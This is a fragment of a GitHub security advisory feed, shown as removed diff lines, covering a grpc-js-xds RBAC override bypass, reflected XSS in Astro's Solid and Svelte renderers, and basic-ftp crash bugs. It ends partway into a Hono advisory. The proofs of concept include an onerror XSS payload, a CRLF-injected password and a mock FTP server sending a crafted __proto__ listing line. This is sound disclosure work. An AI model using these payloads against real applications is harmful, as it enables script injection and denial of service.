-<li><a href="https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.13.2">https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.13.2</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2">https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-r7hq-q2xm-6c5m">https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T23:21:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@grpc/grpc-js-xds] @grpc/grpc-js: RBAC override configs in VirtualHost and Route resources are not applied]]></title>
-        <id>https://github.com/advisories/GHSA-gg5j-6742-v827</id>
-        <link href="https://github.com/advisories/GHSA-gg5j-6742-v827"/>
-        <updated>2026-11-12T22:55:48.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@grpc/grpc-js-xds</td>
-<td><code>&gt;= 1.14.0, &lt; 1.14.2</code></td>
-<td><code>1.14.2</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p><code>XdsServer</code> in <code>@grpc/grpc-js-xds</code> does not apply <code>RBACPerRoute</code> overrides from matching Route or VirtualHost resources. When a trusted xDS control plane supplies a broad top-level ALLOW policy and a stricter override, <code>XdsServer</code> ACKs the resources but evaluates the RPC under the top-level policy.</p>
-<h3 id="details">Details</h3>
-<h3 id="override-parser-lookup-uses-the-override-message-type">Override parser lookup uses the override message type</h3>
-<p><code>parseOverrideFilterConfig()</code> in packages/grpc-js-xds/src/http-filter.ts:225-257 looks up FILTER_REGISTRY using the override message type:</p>
-<p><code>type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBACPerRoute</code>
-Source: <a href="https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter.ts#L225-L257">https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter.ts#L225-L257</a></p>
-<p><code>setup()</code> in packages/grpc-js-xds/src/http-filter/rbac-filter.ts:167-173 registers the filter only under the top-level RBAC type:</p>
-<p><code>type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC</code>
-Source: <a href="https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter/rbac-filter.ts#L167-L173">https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/http-filter/rbac-filter.ts#L167-L173</a></p>
-<p>The lookup returns null even though the registered entry contains <code>parseOverrideRbacConfig()</code>, and server.ts silently skips the override.</p>
-<h3 id="override-maps-are-keyed-by-type-url-instead-of-filter-name">Override maps are keyed by type URL instead of filter name</h3>
-<p><code>overrideConfigMaps</code> in server.ts:99-102 is documented as keyed by HTTP filter name, but server.ts:169-174 stores each map under <code>filterConfig.typeUrl</code>.</p>
-<p>Source: <a href="https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L99-L102">https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L99-L102</a></p>
-<p>Source: <a href="https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L169-L174">https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L169-L174</a></p>
-<p>Route overrides are later looked up by their <code>typed_per_filter_config</code> key, which is the <code>HttpFilter.name</code>. An ordinary key such as rbac therefore misses the stored map.</p>
-<h3 id="virtualhost-overrides-are-not-read">VirtualHost overrides are not read</h3>
-<p><code>handleRouteConfigurationResource()</code> in server.ts:225-249 reads <code>route.typed_per_filter_config</code> but never reads <code>virtualHost.typed_per_filter_config</code>.</p>
-<p>Source: <a href="https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L225-L249">https://github.com/grpc/grpc-node/blob/56567d9604b4e45cdca0d2e3c2a60ac227ee659d/packages/grpc-js-xds/src/server.ts#L225-L249</a></p>
-<p>When no override reaches the RBAC interceptor, rbac-filter.ts:125-155 evaluates the broader top-level policy.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Set:</p>
-<pre><code>GRPC_XDS_EXPERIMENTAL_RBAC=true
-</code></pre>
-<p>Run <code>XdsServer</code> with a protected unary handler.</p>
-<p>Have the ADS control plane deliver a Listener containing an RBAC HTTP filter named rbac with a top-level ALLOW-any policy:</p>
-<pre><code>name: rbac
-typed_config:
-  "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
-  rules:
-    action: ALLOW
-    policies:
-      allow-any:
-        principals: [{ any: true }]
-        permissions: [{ any: true }]
-</code></pre>
-<p>Deliver a matching non-forwarding route with this override:</p>
-<pre><code>typed_per_filter_config:
-  rbac:
-    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBACPerRoute
-    rbac:
-      rules:
-        action: DENY
-        policies:
-          deny-any:
-            principals: [{ any: true }]
-            permissions: [{ any: true }]
-</code></pre>
-<p>Invoke the protected unary method without credentials.</p>
-<p>Expected: The route-specific DENY policy rejects the RPC before the protected handler runs.</p>
-<p>Observed: <code>XdsServer</code> ACKs the resources, retains the top-level ALLOW policy, and runs the protected handler.</p>
-<pre><code>Listener and RouteConfiguration: ACKED
-gRPC status: OK
-handler invocations: 1
-response: PROTECTED_SECRET_RECORD_RBAC_OVERRIDE
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Users of <code>@grpc/grpc-js-xds</code> who are using RBAC-based authentication with override configurations may unintentionally accept some requests that should be rejected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-gg5j-6742-v827">https://github.com/grpc/grpc-node/security/advisories/GHSA-gg5j-6742-v827</a></li>
-<li><a href="https://github.com/grpc/grpc-node/commit/b8f3ced4d4699338dd33dc0f7b1d68d689a31d0e">https://github.com/grpc/grpc-node/commit/b8f3ced4d4699338dd33dc0f7b1d68d689a31d0e</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2">https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-gg5j-6742-v827">https://github.com/advisories/GHSA-gg5j-6742-v827</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-gg5j-6742-v827</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T22:55:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@astrojs/solid-js] Astro: Reflected XSS via unescaped slot names in @astrojs/solid-js]]></title>
-        <id>https://github.com/advisories/GHSA-jmv2-qgxf-f995</id>
-        <link href="https://github.com/advisories/GHSA-jmv2-qgxf-f995"/>
-        <updated>2026-11-12T22:34:45.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@astrojs/solid-js</td>
-<td><code>&gt;= 0.2.0, &lt;= 7.1.1</code></td>
-<td><code>7.1.2</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p>The <code>@astrojs/solid-js</code> renderer wraps named slot content passed to Solid components in an <code>&lt;astro-slot&gt;</code> element, and writes the slot name into its <code>name</code> attribute without HTML escaping. A slot name containing <code>"</code> could end the attribute and inject arbitrary HTML into the page.</p>
-<p>For example, a page that takes a slot name from the request:</p>
-<pre><code class="language-astro">---
-import Tabs from '../components/Tabs.jsx';
-const tab = Astro.url.searchParams.get('tab');
----
-&lt;Tabs client:load active={tab}&gt;&lt;div slot={tab}&gt;…&lt;/div&gt;&lt;/Tabs&gt;
-</code></pre>
-<p>rendered with a Solid component that renders a slot by name:</p>
-<pre><code class="language-jsx">export default function Tabs(props) {
-    return &lt;div&gt;{props[props.active]}&lt;/div&gt;;
-}
-</code></pre>
-<p>would output a <code>tab</code> value such as <code>x"&gt;&lt;img src=x onerror=alert(1)&gt;</code> as live HTML.</p>
-<h2 id="impact">Impact</h2>
-<p>Reflected cross-site scripting. An attacker who gets a user to open a crafted link can run JavaScript on the site's origin, but only in applications where all of the following are true:</p>
-<ul>
-<li>The page passes request-controlled input (such as a query parameter) as a slot name.</li>
-<li>The Solid component is hydrated with a <code>client:*</code> directive. For non-hydrated components the slot wrapper is removed from the output, together with its <code>name</code> attribute.</li>
-<li>The Solid component renders the attacker-chosen slot, which in practice means accessing slot props by a dynamic name. Components that never render the slot only output Astro's already escaped fallback template.</li>
-</ul>
-<p>This is the <code>@astrojs/solid-js</code> counterpart of GHSA-8hv8-536x-4wqp (CVE-2026-50146), which fixed the same issue in <code>astro</code> core.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<p><code>@astrojs/solid-js</code> &gt;= 0.2.0, &lt;= 7.1.1.</p>
-<h2 id="patches">Patches</h2>
-<p>Fixed in <code>@astrojs/solid-js</code> 7.1.2. Slot names are now HTML-escaped in the server renderer.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Upgrade to <code>@astrojs/solid-js</code> 7.1.2 or later. Before upgrading, do not use request-controlled input as a slot name, or map it to a fixed set of known slot names before passing it to a component.</p>
-<h2 id="credits">Credits</h2>
-<p>Reported by @manus-pi.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-jmv2-qgxf-f995">https://github.com/withastro/astro/security/advisories/GHSA-jmv2-qgxf-f995</a></li>
-<li><a href="https://github.com/withastro/astro/commit/290b196ddb48de11783ff128e2b7272c61490a20">https://github.com/withastro/astro/commit/290b196ddb48de11783ff128e2b7272c61490a20</a></li>
-<li><a href="https://github.com/withastro/astro/releases/tag/@astrojs/solid-js@7.1.2">https://github.com/withastro/astro/releases/tag/@astrojs/solid-js@7.1.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-jmv2-qgxf-f995">https://github.com/advisories/GHSA-jmv2-qgxf-f995</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jmv2-qgxf-f995</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-11-12T22:34:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@astrojs/svelte] Astro: Reflected XSS via unescaped slot names in @astrojs/svelte]]></title>
-        <id>https://github.com/advisories/GHSA-f4j9-crrj-867q</id>
-        <link href="https://github.com/advisories/GHSA-f4j9-crrj-867q"/>
-        <updated>2026-11-12T22:34:05.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@astrojs/svelte</td>
-<td><code>&gt;= 5.7.3, &lt;= 9.1.1</code></td>
-<td><code>9.1.2</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p>The <code>@astrojs/svelte</code> renderer wraps slotted content passed to Svelte components in an <code>&lt;astro-slot&gt;</code> element, and writes the slot name into its <code>name</code> attribute without HTML escaping. A slot name containing <code>"</code> could end the attribute and inject arbitrary HTML into the page.</p>
-<p>For example, a page that takes a slot name from the request:</p>
-<pre><code class="language-astro">---
-import Tabs from '../components/Tabs.svelte';
-const tab = Astro.url.searchParams.get('tab');
----
-&lt;Tabs client:load active={tab}&gt;&lt;div slot={tab}&gt;…&lt;/div&gt;&lt;/Tabs&gt;
-</code></pre>
-<p>rendered with a Svelte 5 component that renders its snippets by name:</p>
-<pre><code class="language-svelte">&lt;script&gt;
-    let { active, ...snippets } = $props();
-&lt;/script&gt;
-{@render snippets[active]?.()}
-</code></pre>
-<p>would output a <code>tab</code> value such as <code>x"&gt;&lt;img src=x onerror=alert(1)&gt;</code> as live HTML.</p>
-<h2 id="impact">Impact</h2>
-<p>Reflected cross-site scripting. An attacker who gets a user to open a crafted link can run JavaScript on the site's origin, but only in applications where all of the following are true:</p>
-<ul>
-<li>The page passes request-controlled input (such as a query parameter) as a slot name.</li>
-<li>The Svelte component is hydrated with a <code>client:*</code> directive. For non-hydrated components the slot wrapper is removed from the output, together with its <code>name</code> attribute.</li>
-<li>The Svelte component renders the attacker-chosen slot, which in practice means a Svelte 5 component that renders snippets by a dynamic name. Components that never render the slot only output Astro's already escaped fallback template.</li>
-</ul>
-<p>This is the <code>@astrojs/svelte</code> counterpart of GHSA-8hv8-536x-4wqp (CVE-2026-50146), which fixed the same issue in <code>astro</code> core. The same unescaped value was also used when hydrating the component in the browser.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<p><code>@astrojs/svelte</code> &gt;= 5.7.3, &lt;= 9.1.1.</p>
-<h2 id="patches">Patches</h2>
-<p>Fixed in <code>@astrojs/svelte</code> 9.1.2. Slot names are now HTML-escaped in the server renderer and in the client-side hydration code.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Upgrade to <code>@astrojs/svelte</code> 9.1.2 or later. Before upgrading, do not use request-controlled input as a slot name, or map it to a fixed set of known slot names before passing it to a component.</p>
-<h2 id="credits">Credits</h2>
-<p>Reported by @manus-pi.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-f4j9-crrj-867q">https://github.com/withastro/astro/security/advisories/GHSA-f4j9-crrj-867q</a></li>
-<li><a href="https://github.com/withastro/astro/commit/5e476365378e41aa2745d003b2383d02008d7b44">https://github.com/withastro/astro/commit/5e476365378e41aa2745d003b2383d02008d7b44</a></li>
-<li><a href="https://github.com/withastro/astro/releases/tag/@astrojs/svelte@9.1.2">https://github.com/withastro/astro/releases/tag/@astrojs/svelte@9.1.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-f4j9-crrj-867q">https://github.com/advisories/GHSA-f4j9-crrj-867q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f4j9-crrj-867q</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-11-12T22:34:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[basic-ftp] basic-ftp: Uncaught exception crashes the Node.js process when a password (or resumed-download path) contains CR/LF]]></title>
-        <id>https://github.com/advisories/GHSA-r4jh-29pc-gfqr</id>
-        <link href="https://github.com/advisories/GHSA-r4jh-29pc-gfqr"/>
-        <updated>2026-11-12T22:23:50.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>basic-ftp</td>
-<td><code>&lt;= 6.2.2</code></td>
-<td><code>6.2.3</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>Client.login() calls FTPContext.send() from inside the control-socket data event handler. send() throws on CR, LF or NUL, and nothing catches the throw. A password containing \r\n therefore raises an uncaught exception and terminates the whole Node.js process. It does not reject the returned promise. Any application that passes untrusted input as the FTP password can be crashed remotely with one request. The same pattern exists in the REST/RETR path of downloadTo() when the remote path contains control characters.</p>
-<h3 id="details">Details</h3>
-<p>The CRLF guard (FTPContext.send, src/FtpContext.ts ~L233) correctly refuses to send commands containing \r, \n or \0:</p>
-<pre><code class="language-ts">send(command: string) {
-    if (/[\r\n\0]/.test(command)) {
-        throw new Error(`Invalid command: Contains control characters. (${command})`);
-    }
-</code></pre>
-<p>That works when send() is called from handle(), because it runs inside a Promise executor and the throw becomes a rejection. But in two places send() runs inside a response handler, which is called synchronously from the socket’s data event:</p>
-<p>Client.login() (src/Client.ts ~L246-248): after the server answers 331 to USER, the handler calls this.ftp.send("PASS " + password). The USER command was already sent and is valid, so the password is only checked at this point. The call chain is socket.on("data") → _onControlSocketData → _passToHandler → responseHandler → send() → throw. No try/catch exists anywhere in that chain, so it becomes an uncaughtException.
-downloadTo() (src/transfer.ts ~L368-370): when startAt &gt; 0, the initial command is REST n, which contains no user-controlled text. When the server answers 350, the handler calls config.ftp.send("RETR " + config.remotePath). This remotePath was never checked before. A path with a control character throws in the data handler in the same way. (Found by code reading, not reproduced.)</p>
-<p>Because the exception happens during data event dispatch, it can’t be handled with try/catch or .catch() around client.access() or downloadTo(). The application only survives if it has a global process.on("uncaughtException") handler.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Tested on Node.js v22.22.0 against basic-ftp 6.2.2 (built from source). It uses a minimal mock FTP server on localhost:</p>
-<pre><code class="language-js">const net = require("net")
-const ftp = require("basic-ftp")
-
-const srv = net.createServer(s =&gt; {
-  s.write("220 hi\r\n")
-  s.on("data", d =&gt; {
-    const c = d.toString()
-    if (c.startsWith("USER")) s.write("331 pw\r\n")
-    else if (c.startsWith("PASS")) s.write("230 ok\r\n")
-    else s.write("200 ok\r\n")
-  })
-})
-
-srv.listen(0, async () =&gt; {
-  const c = new ftp.Client(2000)
-  try {
-    await c.access({
-      host: "127.0.0.1",
-      port: srv.address().port,
-      user: "bob",
-      password: "x\r\nDELE important"   // attacker-controlled value
-    })
-  } catch (e) {
-    console.log("rejected:", e.message)  // never reached
-  }
-  console.log("handled gracefully")      // never reached
-  process.exit(0)
-})
-</code></pre>
-<p>Result: the process terminates with an uncaught exception and neither catch nor the final console.log runs:</p>
-<pre><code>Error: Invalid command: Contains control characters. (PASS x
-DELE important)
-    at FTPContext.send (dist/FtpContext.js:189:19)
-    at Object.responseHandler (dist/Client.js:186:26)
-    at FTPContext._passToHandler (dist/FtpContext.js:322:24)
-    at FTPContext._onControlSocketData (dist/FtpContext.js:312:18)
-    at Socket.&lt;anonymous&gt; (dist/FtpContext.js:133:44)
-</code></pre>
-<p>The server in the PoC is benign. Any normal FTP server that replies 331 to USER triggers the same crash.</p>
-<h3 id="impact">Impact</h3>
-<p>Denial of service (uncaught exception, process termination), CWE-248.</p>
-<p>It affects applications that pass untrusted or user-influenced values as the FTP password, or as the remote path of a resumed download. Examples are web apps or services that let users enter their own FTP credentials, or file-transfer or backup tools driven by user-supplied paths. One request crashes the whole Node.js process and every other client it serves. It needs no authentication to the FTP server and no special server behaviour. The attacker only needs control over the string. Confidentiality and integrity are not affected, and the CRLF guard still blocks command injection.</p>
-<p>Suggested fix:</p>
-<p>In FTPContext._passToHandler(), wrap the handler call in a try/catch that rejects the task and calls closeWithError(err).
-Validate password in login(), and remotePath in _downloadToStream(), before any I/O and reject early.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-r4jh-29pc-gfqr">https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-r4jh-29pc-gfqr</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/commit/0495b906bdf891e68806721b07b333dba65ec88e">https://github.com/patrickjuchli/basic-ftp/commit/0495b906bdf891e68806721b07b333dba65ec88e</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.3">https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-r4jh-29pc-gfqr">https://github.com/advisories/GHSA-r4jh-29pc-gfqr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r4jh-29pc-gfqr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T22:23:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[basic-ftp] basic-ftp: Uncaught TypeError in MLSD directory-listing parser via __proto__ fact name causes DoS in Client.list()]]></title>
-        <id>https://github.com/advisories/GHSA-5pm8-86m8-9m6r</id>
-        <link href="https://github.com/advisories/GHSA-5pm8-86m8-9m6r"/>
-        <updated>2026-11-12T21:42:13.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>basic-ftp</td>
-<td><code>&lt;= 6.2.3</code></td>
-<td><code>6.2.4</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name "<strong>proto</strong>" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the "not a function" guard is bypassed and the code throws <code>TypeError: factHandler is not a function</code>.</p>
-<p>This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).</p>
-<h3 id="details">Details</h3>
-<p>File: src/parseListMLSD.ts</p>
-<pre><code>const factHandlersByName: {[key: string]: FactHandler} = {
-    "size": parseSize,
-    "sizd": parseSize,
-    "unique": (value, info) =&gt; { info.uniqueID = value },
-    "modify": (value, info) =&gt; { ... },
-    "type": (value, info) =&gt; { ... },
-    "unix.mode": (value, info) =&gt; { ... },
-    ...
-}
-
-export function parseLine(line: string): FileInfo | undefined {
-    const [ packedFacts, name ] = splitStringOnce(line, " ")
-    ...
-    const facts = packedFacts.split(";")
-    for (const fact of facts) {
-        const [ factName, factValue ] = splitStringOnce(fact, "=")
-        if (!factValue) { continue }
-        const factHandler = factHandlersByName[factName.toLowerCase()]   // &lt;-- unsafe lookup
-        if (!factHandler) { continue }
-        const result = factHandler(factValue, info)                     // &lt;-- throws here
-        ...
-    }
-    return info
-}
-</code></pre>
-<p>factHandlersByName is a plain <code>{}</code> object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === "<strong>proto</strong>", the bracket lookup factHandlersByName["<strong>proto</strong>"] returns Object.prototype itself — a truthy, non-undefined value — so the <code>if (!factHandler) continue</code> guard does not fire. The code then tries to call Object.prototype as a function: <code>factHandler(factValue, info)</code>, which throws <code>TypeError: factHandler is not a function</code>.</p>
-<p>This line runs inside parseList() (src/parseList.ts), called synchronously from a <code>.map()</code> over every line of the listing, which in turn is called from Client._requestListWithCommand() -&gt; Client.list() (src/Client.ts). list()'s only error handling is:</p>
-<pre><code>    catch (err) {
-        const shouldTryNext = err instanceof FTPError
-        if (!shouldTryNext) { throw err }
-        lastError = err
-    }
-</code></pre>
-<p>A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.</p>
-<p>Affected call paths (all eventually call Client.list()):</p>
-<ul>
-<li>Client.list()</li>
-<li>Client.downloadToDir() / _downloadFromWorkingDir()</li>
-<li>Client.clearWorkingDir()</li>
-<li>Client.removeDir()</li>
-</ul>
-<p>Only "<strong>proto</strong>" triggers the crash this way; other reserved Object.prototype property names tested ("constructor", "toString", "hasOwnProperty", "valueOf", "<strong>defineGetter</strong>") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.</p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Prerequisites: Node.js, a clone/checkout of basic-ftp, <code>npm install</code> then <code>npm run buildOnly</code> (or <code>npx tsc</code>) to produce dist/.</p>
-<p>Step 1 — Minimal reproduction of the parser bug alone:</p>
-<pre><code>node -e '
-const { parseList } = require("./dist/parseList");
-parseList("__proto__=x;type=file;size=10; evil.txt");
-'
-</code></pre>
-<p>Expected result:
-    Uncaught TypeError: factHandler is not a function
-        at parseLine (.../dist/parseListMLSD.js:...)</p>
-<p>Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:</p>
-<pre><code>Save as poc.js in the repo root and run `node poc.js`:
-
-const net = require("net")
-const { Client } = require("./dist/index")
-
-const server = net.createServer(socket =&gt; {
-    socket.write("220 fake ftp ready\r\n")
-    socket.on("data", data =&gt; {
-        const cmd = data.toString().trim()
-        if (cmd.startsWith("USER")) socket.write("230 ok\r\n")
-        else if (cmd.startsWith("OPTS") || cmd.startsWith("TYPE") ||
-                 cmd.startsWith("STRU") || cmd.startsWith("PBSZ") ||
-                 cmd.startsWith("PROT")) socket.write("200 ok\r\n")
-        else if (cmd.startsWith("FEAT")) socket.write("211-Features\r\n MLST type;size;\r\n211 End\r\n")
-        else if (cmd.startsWith("EPSV")) {
-            const dataServer = net.createServer(dsock =&gt; {
-                // The malicious line: fact name "__proto__"
-                dsock.end("__proto__=pwn;type=file;size=4; evil.txt\r\n")
-            })
-            dataServer.listen(0, "127.0.0.1", () =&gt; {
-                const p = dataServer.address().port
-                socket.write(`229 Entering Extended Passive Mode (|||${p}|)\r\n`)
-            })
-        }
-        else if (cmd.startsWith("MLSD") || cmd.startsWith("LIST")) {
-            socket.write("150 Here comes the listing\r\n")
-            setTimeout(() =&gt; socket.write("226 Listing complete\r\n"), 50)
-        }
-        else socket.write("200 ok\r\n")
-    })
-})
-
-server.listen(2121, "127.0.0.1", async () =&gt; {
-    const client = new Client()
-    try {
-        await client.access({ host: "127.0.0.1", port: 2121, user: "a", password: "b" })
-        const files = await client.list()
-        console.log("list() returned normally (unexpected):", files)
-    } catch (err) {
-        console.log("client.list() threw:", err.constructor.name, "-", err.message)
-    } finally {
-        client.close()
-        server.close()
-        process.exit(0)
-    }
-})
-</code></pre>
-<p>Expected output:</p>
-<pre><code>client.list() threw: TypeError - factHandler is not a function
-</code></pre>
-<p>Configuration notes:</p>
-<ul>
-<li>No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV
-text) session using the server's FEAT response to turn on MLSD, which is the common
-path for any modern FTP server.</li>
-<li>The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since
-parseList() auto-detects the format from the last listing line.</li>
-<li>In a real application without a try/catch around list()/downloadToDir()/
-clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the
-Node.js process by default (Node &gt;=15 unhandledRejection behavior is "throw").</li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p>Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).</p>
-<p>Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.</p>
-<p>Confidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r">https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6">https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6</a></li>
-<li><a href="https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4">https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-5pm8-86m8-9m6r">https://github.com/advisories/GHSA-5pm8-86m8-9m6r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5pm8-86m8-9m6r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T21:42:12.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@hono/node-server] @hono/node-server: Unhandled `ECONNRESET` on the socket during an asynchronous WebSocket upgrade crashes the process]]></title>
-        <id>https://github.com/advisories/GHSA-qv5m-9pm6-hqp3</id>
-        <link href="https://github.com/advisories/GHSA-qv5m-9pm6-hqp3"/>
-        <updated>2026-11-12T21:32:49.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@hono/node-server</td>
-<td><code>&gt;= 2.0.0, &lt; 2.1.6</code></td>
